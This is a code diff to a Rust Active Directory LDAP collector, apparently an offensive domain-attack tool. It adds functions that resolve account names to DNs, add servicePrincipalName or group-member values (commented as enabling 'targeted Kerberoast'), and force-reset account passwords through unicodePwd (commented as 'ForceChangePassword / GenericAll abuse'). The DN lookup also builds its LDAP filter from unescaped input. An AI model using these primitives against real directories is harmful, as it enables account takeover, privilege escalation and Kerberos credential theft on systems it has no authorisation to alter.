@@ -10,7 +10,7 @@ use anyhow::{Context, Result};
 use ldap3::adapters::{Adapter, EntriesOnly, PagedResults};
 use ldap3::controls::RawControl;
 use ldap3::{LdapConnAsync, Scope, SearchEntry};
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 
 /// LDAP_SERVER_SD_FLAGS_OID — ask the server for only OWNER|GROUP|DACL of
 /// nTSecurityDescriptor (0x7), omitting the SACL. Without this, a non-admin bind gets an
@@ -173,6 +173,38 @@ impl Collector {
             out.push(to_object(SearchEntry::construct(entry)));
         }
         stream.finish().await.success().ok();
+        Ok(())
+    }
+
+    /// Resolve a sAMAccountName to its DN.
+    pub async fn resolve_dn(&mut self, sam: &str) -> Result<String> {
+        let base = self.base_dn.clone();
+        let (rs, _) = self
+            .ldap
+            .search(&base, Scope::Subtree, &format!("(sAMAccountName={sam})"), vec!["distinguishedName"])
+            .await?
+            .success()?;
+        let e = rs.into_iter().next().context("object not found")?;
+        Ok(SearchEntry::construct(e).dn)
+    }
+
+    /// Add a value to a (multi-valued) attribute — e.g. a servicePrincipalName (targeted
+    /// Kerberoast) or a group `member`. Requires write rights on the object.
+    pub async fn add_value(&mut self, dn: &str, attr: &str, value: &str) -> Result<()> {
+        use ldap3::Mod;
+        let m: Mod<Vec<u8>> = Mod::Add(attr.as_bytes().to_vec(), HashSet::from([value.as_bytes().to_vec()]));
+        self.ldap.modify(dn, vec![m]).await?.success().context("modify (add) failed")?;
+        Ok(())
+    }
+
+    /// Force-set an account password (ForceChangePassword / GenericAll abuse). unicodePwd
+    /// is a quoted UTF-16LE string; the DC requires the connection to be encrypted (LDAPS).
+    pub async fn set_password(&mut self, dn: &str, password: &str) -> Result<()> {
+        use ldap3::Mod;
+        let quoted = format!("\"{password}\"");
+        let utf16: Vec<u8> = quoted.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let m: Mod<Vec<u8>> = Mod::Replace(b"unicodePwd".to_vec(), HashSet::from([utf16]));
+        self.ldap.modify(dn, vec![m]).await?.success().context("password set failed (needs LDAPS + rights)")?;
         Ok(())
     }
 
